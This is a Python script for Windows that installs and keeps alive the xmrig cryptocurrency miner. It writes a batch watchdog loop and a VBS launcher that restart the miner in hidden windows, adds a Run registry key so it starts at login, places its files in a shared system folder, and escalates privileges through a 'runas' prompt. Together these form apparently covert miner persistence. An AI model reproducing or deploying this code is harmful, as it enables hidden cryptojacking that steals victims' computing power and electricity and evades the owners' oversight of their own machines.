import os
import subprocess
import requests
import getpass
import ctypes
import sys
import time

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def check_process(process_name):
    try:
        result = subprocess.run(["tasklist", "/NH", "/FI", f'IMAGENAME eq {process_name}'], capture_output=True, text=True, check=True)
        return process_name in result.stdout
    except subprocess.CalledProcessError:
        return False

def add_to_startup(file_path):
    username = getpass.getuser()
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        import winreg as reg
        key = reg.HKEY_CURRENT_USER
        key_value = f"xmrig_checker_{username}"
        reg_key = reg.OpenKey(key, key_path, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(reg_key, key_value, 0, reg.REG_SZ, file_path)
        reg.CloseKey(reg_key)
        print("Added to startup registry.")
    except Exception as e:
        print(f"Error adding to startup registry: {e}")

def create_files(file_path, content):
    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
        with open(file_path, 'w') as file:
            file.write(content)

if __name__ == "__main__":
    exe_name = "xmrig.exe"
    xmrig_path = r"C:\Program Files\Common Files\xmrig"

    if not os.path.exists(xmrig_path):
        os.makedirs(xmrig_path)

    startup_file_path = os.path.join(xmrig_path, "xmrig_check.bat")
    check_startup_file_path = os.path.join(xmrig_path, "check_xmrig.bat")
    vbs_file_path = os.path.join(xmrig_path, "xmrig_check.vbs")

    check_xmrig_content = f"""@echo off
:Check
timeout /T 60
tasklist /NH /FI "IMAGENAME eq {exe_name}" | find /i "{exe_name}" > nul
if errorlevel 1 (
    cd /d "{xmrig_path}"
    start powershell -WindowStyle Hidden -Command Start-Process -FilePath {exe_name} -WindowStyle Hidden
)
goto Check
"""

    create_files(startup_file_path, check_xmrig_content)

    check_xmrig = f"""@echo off
cd %~dp0 && start "" xmrig_check.vbs && exit
"""

    create_files(check_startup_file_path, check_xmrig)

    add_to_startup(check_startup_file_path)

    vbs_content = f"""Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /C xmrig_check.bat", 0, True
Set objShell = Nothing
"""

    create_files(vbs_file_path, vbs_content)
if os.path.exists(check_startup_file_path) and os.path.getsize(check_startup_file_path) > 0:
    os.system(f'start /MIN cmd /c "{check_startup_file_path}"')
    print("Task started in a new console window.")
elif is_admin():
    os.system(f'start cmd /c "{startup_file_path}"')
    print("Task started in a new console window.")
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{os.path.abspath(__file__)}"', None, 1)

while True:
    if not check_process(exe_name):
        print(f"{exe_name} is Not Running. Starting...")
        try:
            os.system(f'start /MIN cmd /c "{startup_file_path}"')
        except subprocess.CalledProcessError as e:
            print(f"Error starting {exe_name}: {e}")
        break  # Sortir de la boucle après le redémarrage
    else:
        print(f"{exe_name} is running")